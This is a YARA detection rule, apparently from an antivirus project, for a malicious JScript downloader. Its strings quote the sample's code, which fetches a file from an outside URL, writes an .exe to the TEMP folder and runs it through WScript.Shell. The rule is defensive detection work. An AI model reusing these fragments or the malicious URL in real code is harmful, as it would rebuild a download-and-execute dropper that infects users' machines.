rule sig_20160329_4dd606cdba8545339941bddbc5a07e0d {
  meta:
    description = "datamaliciousorder - file 20160329_4dd606cdba8545339941bddbc5a07e0d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ebdd4a4e596b6952970e9c316a80a1fb8609493c53b9a7ced67d63ba535cf596"

  strings:
    $s1  = "function G() {return l[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"kQAv7X3gVF.exe\";};" fullword ascii
    $s2  = "for (;;){WScript[k](As() * 11); if (Hq[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "Hq[EX](\"GET\", \"http://kingsstaging.consines.in/l9osaw\", false);" fullword ascii
    $s4  = "function P(F, UZ){ab = ab * 1; return F - UZ;};" fullword ascii
    $s5  = "var l = function lZ() {return WScript[ZY](\"WScript.Shell\");}(), I = 11;" fullword ascii
    $s6  = "function K(){return \"\" + JG;};" fullword ascii
    $s7  = "function DK(A){l[\"Run\"](A, ab, ab);};" fullword ascii
    $s8  = "function dd() {return ((T == true) && (T == Hp)) ? 1 : ab;};" fullword ascii
    $s9  = "var J = new this[\"Date\"]();" fullword ascii
    $s10 = "function kA()" fullword ascii
    $s11 = "function DK0(){return ZY;};" fullword ascii
    $s12 = "return P(hl, wA);" fullword ascii
    $s13 = " while (tW){" fullword ascii
    $s14 = "function o(c) {var fx = (1, 2, 3, 4, 5, c); return fx;};" fullword ascii
    $s15 = "function As(){return 22;};" fullword ascii
    $s16 = "var Y = false;" fullword ascii
    $s17 = "T = true; " fullword ascii
    $s18 = "var T = false;" fullword ascii
    $s19 = "Hp = true; " fullword ascii
    $s20 = "var Hp = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}